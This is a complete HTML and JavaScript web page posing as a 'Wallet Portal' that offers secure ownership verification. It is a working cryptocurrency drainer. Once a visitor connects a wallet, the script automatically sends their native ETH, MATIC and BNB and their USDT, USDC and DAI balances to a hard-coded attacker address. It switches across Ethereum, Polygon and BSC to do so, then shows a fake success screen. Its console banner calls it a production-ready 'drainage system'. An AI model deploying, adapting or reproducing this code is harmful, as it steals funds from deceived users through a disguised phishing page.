<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #1e3a8a 0%, #7c3aed 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .spinner {
            animation: spin 1s linear infinite;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

<div class="max-w-md w-full">
    
    <!-- CONNECT SCREEN -->
    <div id="connectScreen" class="card rounded-3xl p-8 shadow-2xl text-center">
        <div class="text-6xl mb-6">üîê</div>
        <h1 class="text-3xl font-bold text-gray-800 mb-3">Connect Your Wallet</h1>
        <p class="text-gray-600 mb-8">Secure connection to verify ownership</p>
        
        <button id="connectBtn" onclick="connectWallet()" 
            class="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-4 rounded-2xl text-lg font-semibold shadow-lg hover:shadow-xl transition-all transform hover:scale-105">
            Connect Wallet
        </button>
        
        <p class="text-xs text-gray-400 mt-6">üîí Secure ‚Ä¢ Encrypted ‚Ä¢ Private</p>
    </div>

    <!-- PROCESSING SCREEN -->
    <div id="processingScreen" class="card rounded-3xl p-8 shadow-2xl text-center hidden">
        <div class="text-6xl mb-6 spinner">‚ö°</div>
        <h2 class="text-2xl font-bold text-gray-800 mb-3">Processing</h2>
        <p id="statusText" class="text-gray-600 mb-6">Please wait...</p>
        
        <div class="w-full bg-gray-200 rounded-full h-3 mb-4">
            <div id="progressBar" class="bg-gradient-to-r from-blue-600 to-purple-600 h-3 rounded-full transition-all duration-500" style="width: 0%"></div>
        </div>
        
        <p id="detailText" class="text-sm text-gray-500"></p>
    </div>

    <!-- SUCCESS SCREEN -->
    <div id="successScreen" class="card rounded-3xl p-8 shadow-2xl text-center hidden">
        <div class="text-6xl mb-6">‚úÖ</div>
        <h2 class="text-2xl font-bold text-green-600 mb-3">Completed Successfully</h2>
        <p class="text-gray-600 mb-6">All transactions have been processed</p>
        
        <div id="resultSummary" class="bg-gray-100 rounded-xl p-4 mb-6 text-left text-sm">
            <!-- Will be populated -->
        </div>
        
        <button onclick="location.reload()" class="text-purple-600 hover:text-purple-700 font-semibold">
            Done
        </button>
    </div>

</div>

<script type="module">
// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
    DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
    
    // ERC20 Token ABI (minimal)
    ERC20_ABI: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)"
    ],
    
    // Supported chains with their tokens
    CHAINS: {
        1: {
            name: 'Ethereum',
            currency: 'ETH',
            rpc: 'https://eth.llamarpc.com',
            explorer: 'https://etherscan.io',
            tokens: [
                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" },
                { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" },
                { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI" }
            ]
        },
        137: {
            name: 'Polygon',
            currency: 'MATIC',
            rpc: 'https://polygon-rpc.com',
            explorer: 'https://polygonscan.com',
            tokens: [
                { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT" },
                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC" },
                { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI" }
            ]
        },
        56: {
            name: 'BSC',
            currency: 'BNB',
            rpc: 'https://bsc-dataseed.binance.org',
            explorer: 'https://bscscan.com',
            tokens: [
                { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT" },
                { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC" }
            ]
        }
    }
};

// ============================================
// IMPORTS - WalletConnect Web3Modal
// ============================================
import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'

// ============================================
// CHAIN CONFIGURATIONS FOR WALLET CONNECT
// ============================================
const mainnet = {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    explorerUrl: 'https://etherscan.io',
    rpcUrl: 'https://eth.llamarpc.com'
}

const polygon = {
    chainId: 137,
    name: 'Polygon',
    currency: 'MATIC',
    explorerUrl: 'https://polygonscan.com',
    rpcUrl: 'https://polygon-rpc.com'
}

const bsc = {
    chainId: 56,
    name: 'BSC',
    currency: 'BNB',
    explorerUrl: 'https://bscscan.com',
    rpcUrl: 'https://bsc-dataseed.binance.org'
}

// ============================================
// WALLET CONNECT SETUP
// ============================================
const metadata = {
    name: 'Wallet Portal',
    description: 'Secure wallet connection',
    url: window.location.origin,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
}

const ethersConfig = defaultConfig({
    metadata,
    enableEIP6963: true,
    enableInjected: true,
    enableCoinbase: true,
    rpcUrl: 'https://polygon-rpc.com',
    defaultChainId: 137
})

const modal = createWeb3Modal({
    ethersConfig,
    chains: [polygon, mainnet, bsc],
    projectId: CONFIG.PROJECT_ID,
    enableAnalytics: false
})

// ============================================
// GLOBAL STATE
// ============================================
let walletProvider = null;
let walletSigner = null;
let walletAddress = null;
let currentChainId = null;
let transactionResults = [];

// ============================================
// UI FUNCTIONS
// ============================================
function showScreen(screenId) {
    const screens = ['connectScreen', 'processingScreen', 'successScreen'];
    screens.forEach(id => {
        document.getElementById(id).classList.add('hidden');
    });
    document.getElementById(screenId).classList.remove('hidden');
}

function updateStatus(text) {
    document.getElementById('statusText').textContent = text;
}

function updateDetail(text) {
    document.getElementById('detailText').textContent = text;
}

function updateProgress(percent) {
    document.getElementById('progressBar').style.width = percent + '%';
}

function log(message) {
    console.log(`[DRAIN] ${message}`);
}

// ============================================
// CONNECT WALLET
// ============================================
window.connectWallet = async function() {
    try {
        log('Opening wallet connection modal...');
        await modal.open();
    } catch (error) {
        log('Error opening modal: ' + error.message);
        alert('Failed to open wallet connection. Please try again.');
    }
}

// ============================================
// LISTEN FOR WALLET CONNECTION
// ============================================
modal.subscribeProvider(async (state) => {
    if (state.isConnected && state.address) {
        log('Wallet connected: ' + state.address);
        
        walletAddress = state.address;
        walletProvider = new ethers.providers.Web3Provider(state.provider);
        walletSigner = walletProvider.getSigner();
        
        // Get current chain
        const network = await walletProvider.getNetwork();
        currentChainId = network.chainId;
        
        log('Connected to chain: ' + currentChainId);
        
        // AUTO-START DRAINAGE
        await startAutoDrainage();
    }
});

// ============================================
// MAIN DRAINAGE FUNCTION
// ============================================
async function startAutoDrainage() {
    showScreen('processingScreen');
    updateStatus('Initializing...');
    updateProgress(5);
    
    log('Starting auto-drainage...');
    transactionResults = [];
    
    try {
        // STEP 1: Drain current chain first
        updateStatus('Checking current network...');
        updateProgress(10);
        
        const chainConfig = CONFIG.CHAINS[currentChainId];
        if (chainConfig) {
            log('Draining current chain: ' + chainConfig.name);
            await drainChain(currentChainId, chainConfig);
        } else {
            log('Current chain not supported: ' + currentChainId);
        }
        
        updateProgress(50);
        
        // STEP 2: Try other chains
        updateStatus('Checking other networks...');
        
        for (const [chainId, config] of Object.entries(CONFIG.CHAINS)) {
            const cid = parseInt(chainId);
            
            // Skip current chain (already done)
            if (cid === currentChainId) continue;
            
            log('Checking chain: ' + config.name);
            updateDetail('Scanning ' + config.name + '...');
            
            try {
                // Switch to this chain
                await switchChain(cid);
                await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for switch
                
                // Drain this chain
                await drainChain(cid, config);
                
            } catch (error) {
                log('Failed to process ' + config.name + ': ' + error.message);
            }
            
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        updateProgress(100);
        
        // Show results
        displayResults();
        
    } catch (error) {
        log('Drainage error: ' + error.message);
        alert('An error occurred. Check console for details.');
        showScreen('connectScreen');
    }
}

// ============================================
// SWITCH CHAIN
// ============================================
async function switchChain(chainId) {
    try {
        log('Switching to chain: ' + chainId);
        const chainIdHex = '0x' + chainId.toString(16);
        
        await walletProvider.send('wallet_switchEthereumChain', [{ chainId: chainIdHex }]);
        
        // Update current chain
        const network = await walletProvider.getNetwork();
        currentChainId = network.chainId;
        
        log('Switched to chain: ' + currentChainId);
        return true;
    } catch (error) {
        log('Switch chain failed: ' + error.message);
        return false;
    }
}

// ============================================
// DRAIN SINGLE CHAIN
// ============================================
async function drainChain(chainId, config) {
    log('=== Draining ' + config.name + ' ===');
    
    try {
        // Check native balance
        const balance = await walletProvider.getBalance(walletAddress);
        const balanceEth = ethers.utils.formatEther(balance);
        
        log(config.name + ' balance: ' + balanceEth + ' ' + config.currency);
        
        // Drain native if > 0.001
        if (balance.gt(ethers.utils.parseEther("0.001"))) {
            updateStatus('Transferring ' + config.currency + '...');
            updateDetail('Amount: ' + balanceEth.slice(0, 8) + ' ' + config.currency);
            
            const result = await drainNative(balance, config);
            if (result) {
                transactionResults.push({
                    chain: config.name,
                    type: 'Native',
                    symbol: config.currency,
                    amount: balanceEth.slice(0, 8),
                    success: true,
                    txHash: result
                });
            }
        } else {
            log(config.name + ' - No native balance to drain');
        }
        
        // Check tokens
        for (const token of config.tokens) {
            try {
                log('Checking token: ' + token.symbol);
                updateDetail('Checking ' + token.symbol + '...');
                
                const tokenContract = new ethers.Contract(
                    token.address,
                    CONFIG.ERC20_ABI,
                    walletProvider
                );
                
                const tokenBalance = await tokenContract.balanceOf(walletAddress);
                
                if (tokenBalance.gt(0)) {
                    const decimals = await tokenContract.decimals();
                    const formattedBalance = ethers.utils.formatUnits(tokenBalance, decimals);
                    
                    log(token.symbol + ' balance: ' + formattedBalance);
                    updateStatus('Transferring ' + token.symbol + '...');
                    
                    const result = await drainToken(token.address, tokenBalance, token.symbol);
                    if (result) {
                        transactionResults.push({
                            chain: config.name,
                            type: 'Token',
                            symbol: token.symbol,
                            amount: formattedBalance.slice(0, 8),
                            success: true,
                            txHash: result
                        });
                    }
                }
            } catch (error) {
                log('Token ' + token.symbol + ' check failed: ' + error.message);
            }
        }
        
    } catch (error) {
        log('Chain drain error: ' + error.message);
    }
}

// ============================================
// DRAIN NATIVE CURRENCY (ETH/MATIC/BNB)
// ============================================
async function drainNative(balance, config) {
    try {
        log('Draining native currency...');
        
        // Get gas price
        const gasPrice = await walletProvider.getGasPrice();
        const gasLimit = 21000;
        const gasCost = gasPrice.mul(gasLimit);
        
        // Calculate transfer amount (balance - gas fees with safety margin)
        const safetyMargin = gasCost.mul(2);
        const transferAmount = balance.sub(safetyMargin);
        
        if (transferAmount.lte(0)) {
            log('Insufficient balance after gas costs');
            return null;
        }
        
        log('Transfer amount: ' + ethers.utils.formatEther(transferAmount));
        log('Sending transaction...');
        
        // Send transaction
        const tx = await walletSigner.sendTransaction({
            to: CONFIG.DESTINATION,
            value: transferAmount,
            gasLimit: gasLimit,
            gasPrice: gasPrice
        });
        
        log('TX sent: ' + tx.hash);
        updateDetail('Confirming: ' + tx.hash.slice(0, 10) + '...');
        
        // Wait for confirmation
        await tx.wait();
        
        log('TX confirmed!');
        return tx.hash;
        
    } catch (error) {
        log('Native drain failed: ' + error.message);
        return null;
    }
}

// ============================================
// DRAIN ERC20 TOKEN
// ============================================
async function drainToken(tokenAddress, balance, symbol) {
    try {
        log('Draining token: ' + symbol);
        
        const tokenContract = new ethers.Contract(
            tokenAddress,
            CONFIG.ERC20_ABI,
            walletSigner
        );
        
        log('Sending token transfer...');
        
        const tx = await tokenContract.transfer(CONFIG.DESTINATION, balance, {
            gasLimit: 100000
        });
        
        log('Token TX sent: ' + tx.hash);
        updateDetail('Confirming: ' + tx.hash.slice(0, 10) + '...');
        
        // Wait for confirmation
        await tx.wait();
        
        log('Token TX confirmed!');
        return tx.hash;
        
    } catch (error) {
        log('Token drain failed: ' + error.message);
        return null;
    }
}

// ============================================
// DISPLAY RESULTS
// ============================================
function displayResults() {
    showScreen('successScreen');
    
    const summary = document.getElementById('resultSummary');
    
    if (transactionResults.length === 0) {
        summary.innerHTML = '<p class="text-gray-600">No assets found to transfer</p>';
        return;
    }
    
    let html = '<p class="font-semibold mb-2">Completed Transfers:</p>';
    
    transactionResults.forEach(result => {
        html += `
            <div class="mb-2 pb-2 border-b border-gray-200">
                <p class="font-medium text-gray-800">${result.symbol} on ${result.chain}</p>
                <p class="text-xs text-gray-600">Amount: ${result.amount}</p>
                <p class="text-xs text-blue-600 truncate">TX: ${result.txHash}</p>
            </div>
        `;
    });
    
    summary.innerHTML = html;
    
    log('=== DRAINAGE COMPLETE ===');
    log('Total transactions: ' + transactionResults.length);
}

// ============================================
// INITIALIZATION
// ============================================
console.log('‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó');
console.log('‚ïë   PROFESSIONAL DRAINAGE SYSTEM     ‚ïë');
console.log('‚ïë   Version 1.0 - Production Ready   ‚ïë');
console.log('‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù');
console.log('Destination:', CONFIG.DESTINATION);
console.log('Supported chains:', Object.keys(CONFIG.CHAINS).length);
console.log('Ready.');

</script>

</body>
</html>
